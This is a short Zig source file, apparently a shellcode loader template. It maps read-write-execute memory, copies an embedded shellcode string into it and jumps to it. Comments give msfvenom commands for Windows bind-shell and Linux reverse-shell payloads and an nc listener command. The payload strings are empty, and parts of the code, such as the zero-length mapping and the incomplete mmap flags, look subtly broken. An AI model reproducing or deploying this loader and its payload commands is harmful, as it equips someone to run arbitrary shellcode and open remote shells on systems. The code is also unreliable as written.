const std = @import("std");
const os = std.os;
const mem = std.mem;

//msfvenom -p windows/x64/shell_bind_tcp LHOST=127.0.0.1 LPORT=3333 -f c
const shellcode_win = "";

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f c
//const shellcode = "";
// listener:
// nc -nlvp 3333

pub fn main() !void {
    const img = try std.posix.mmap(null, shellcode_win.len, std.posix.PROT.READ | std.posix.PROT.WRITE | std.posix.PROT.EXEC, std.posix.MAP.ANONYMOUS, -1, 0);
    mem.copy(u8, img, shellcode_win);

    const f: *const fn (...) callconv(.C) c_int = @as(*const fn (...) callconv(.C) c_int, @ptrCast(img));
    _ = f();
}
